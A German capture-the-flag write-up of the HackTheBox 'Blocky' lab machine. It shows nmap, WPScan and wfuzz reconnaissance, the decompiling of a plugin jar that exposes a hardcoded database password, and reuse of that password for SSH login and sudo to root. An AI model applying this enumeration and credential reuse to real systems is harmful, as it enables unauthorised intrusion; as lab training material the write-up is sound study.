---
title: "HackTheBox - Blocky WriteUp | Tipps + Anleitung"
date: 2017-12-21T21:45:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---

[Blocky](https://www.hackthebox.eu/home/machines/profile/48) ist eine der vielen Verfügbaren CTF Challenges auf [HackTheBox](https://hackthebox.eu/). [Blocky](https://www.hackthebox.eu/home/machines/profile/48) gehört zu den einfacheren Maschinen von [HackTheBox](https://hackthebox.eu/) und ist deswegen sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.

[![difficulty](https://imgur.com/eLVu2jE.jpg)](https://imgur.com/eLVu2jE)

## **Tipps**

- Welche Verzeichnisse kannst du finden? Eventuell eins, welches mit Plugins zu tun hat?
- Man sollte nie Passwörter mehrmals verwenden...

## **Anleitung**

Zuerst machen wir wie gewohnt einen Nmap-Scan um herauszufinden welche Ports offen sind. Dabei benutzen wir die Option **-A** um das Betriebssystem und ebenfalls die Services herauszufinden, welche auf den jeweiligen Ports laufen.

```shell
root@kali:~# nmap -A 10.10.10.37

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-21 21:13 CET
Nmap scan report for 10.10.10.37
Host is up (0.021s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
21/tcp open ftp ProFTPD 1.3.5a
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (EdDSA)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft - Under Construction!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</pre>

Der Nmap-Scan liefert folgende interessante Ergebnisse:  
Port 21: FTP ( ProFTPD )  
Port 22: SSH ( OpenSSH )  
Port 80: HTTP ( Apache / Wordpress )
```

Da der Apache Server eine Wordpress Seite bereitstellt, können wir WPScan benutzen, welches nach Schwachstellen und Informationen ( wie z.B. Benutzernamen ) sucht. Eventuell haben wir Glück und es gibt eine vielversprechende Schwachstelle.

```shell
root@kali:~# wpscan -u http://10.10.10.37 --enumerate u

[+] URL: http://10.10.10.37/
[+] Started: Thu Dec 21 21:34:59 2017

[!] The WordPress 'http://10.10.10.37/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[+] XML-RPC Interface available under: http://10.10.10.37/xmlrpc.php
[!] Upload directory has directory listing enabled: http://10.10.10.37/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://10.10.10.37/wp-includes/

[+] WordPress version 4.8 (Released on 2017-06-08) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
[!] 12 vulnerabilities identified from the version number

[... Aufzählung der Schwachstellen aus habe ich für eine bessere Übersichtlichkeit entfernt]

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
+----+-------+---------+
| Id | Login | Name |
+----+-------+---------+
| 1 | notch | Notch – |
+----+-------+---------+
```
Es wurden 12 Schwachstellen gefunden, allerdings keine die uns weiterbringen würde, weswegen ich die Aufzählung dieser entfernt habe.  
Immerhin haben wir einen Login-Namen gefunden und zwar **notch**. Dies könnte uns noch zum Nutzen sein.

Nun wäre es sinnvoll die Verzeichnisse der Wordpress-Seite zu bruteforcen. Ich benutze dafür wfuzz, welches bei Kali-Linux standardmäßig schon installiert seien sollte. Andere Anwendung, welche denselben Zweck erfüllen, kannst du natürlich auch benutzen. Zum Beispiel gobuster, dirb, dirbuster oder eine andere Anwendung deiner Wahl. Ich benutze als Wortliste die common.txt Text-Datei die von dirb standardmäßig in Kali-Linux in dem Verzeichnis **/usr/share/dirb/wordlists/common.txt** bereit gestellt wird. Als zusätzliche Option benutze ich bei wfuzz **--hc 404**, damit nicht gefundene Verzeichnisse / Dateien nicht im Terminal ausgegeben wird.

```shell
root@kali:~# wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt --hc 404 http://10.10.10.37/FUZZ

Target: HTTP://10.10.10.37/FUZZ
Total requests: 4614

==================================================================
ID Response Lines Word Chars Payload
==================================================================

00001: C=200 313 L 3592 W 52256 Ch ""
00011: C=403 11 L 32 W 290 Ch ".hta"
02021: C=301 0 L 0 W 0 Ch "index.php"
02145: C=301 9 L 28 W 315 Ch "javascript"
02954: C=301 9 L 28 W 315 Ch "phpmyadmin"
03003: C=301 9 L 28 W 312 Ch "plugins"
03588: C=403 11 L 32 W 299 Ch "server-status"
04454: C=301 9 L 28 W 309 Ch "wiki"
04485: C=301 9 L 28 W 313 Ch "wp-admin"
04495: C=301 9 L 28 W 315 Ch "wp-content"
04501: C=301 9 L 28 W 316 Ch "wp-includes"
04568: C=405 0 L 6 W 42 Ch "xmlrpc.php"
00012: C=403 11 L 32 W 295 Ch ".htaccess"
00013: C=403 11 L 32 W 295 Ch ".htpasswd"

Total time: 315.8989
Processed Requests: 4614
Filtered Requests: 4600
Requests/sec.: 14.60593
```

Unter **http://10.10.10.37/plugins** können wir etwas interessantes finden. Und zwar zwei .jar Dateien. Laden wir uns diese doch herunter und sehen sie uns genauer an.

[![files](https://imgur.com/N0Kp1wH.jpg)](https://imgur.com/N0Kp1wH)

[![blockycore.jar](https://imgur.com/i40lrYH.jpg)](https://imgur.com/i40lrYH)

Mithilfe von JAD können wir Java .class Dateien dekompilieren. Dekompilieren wir mal **BlockyCore.class**.

```shell
root@kali:~/Desktop/Blocky# jad BlockyCore.class

Parsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)
Generating BlockyCore.jad
root@kali:~/Desktop/Blocky# cat BlockyCore.jad
// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3)
// Source File Name: BlockyCore.java

package com.myfirstplugin;

public class BlockyCore
{

public BlockyCore()
{
sqlHost = "localhost";
sqlUser = "root";
sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
}

public void onServerStart()
{
}

public void onServerStop()
{
}

public void onPlayerJoin()
{
sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
}

public void sendMessage(String s, String s1)
{
}

public String sqlHost;
public String sqlUser;
public String sqlPass;
```

Ein Passwort für die SQL-Datenbank! Und das sogar unverschlüsselt... Was wir wohl damit alles anstellen können!

Versuchen wir uns doch beim SSH-Server mit dem bei Wordpress gefundenen Nutzernamen **notch** und dem in der **BlockyCore.class** gefundenen SQL-Passwort anzumelden.  
Vielleicht ist der Server-Administrator so unvorsichtig und benutzt dieselben Daten auch für den SSH-Login...

```shell
root@kali:~# ssh notch@10.10.10.37

notch@10.10.10.37's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

notch@Blocky:~$ ls
minecraft user.txt
```

Es hat funktioniert!  
Nun müssen wir nur noch an die Root-Rechte kommen

Kann es sein, dass der Administrator wieder dasselbe Passwort für den Super-User benutzt? Das kann doch normalerweise nicht sein... Aber vielleicht haben wir ja Glück.

```shell
notch@Blocky:~$ sudo su

[sudo] password for notch:
root@Blocky:/home/notch# cd /root/
root@Blocky:~# ls
root.txt
```

Wow... Dass jemand sooft dasselbe Passwort verwendet... Aber gut für uns!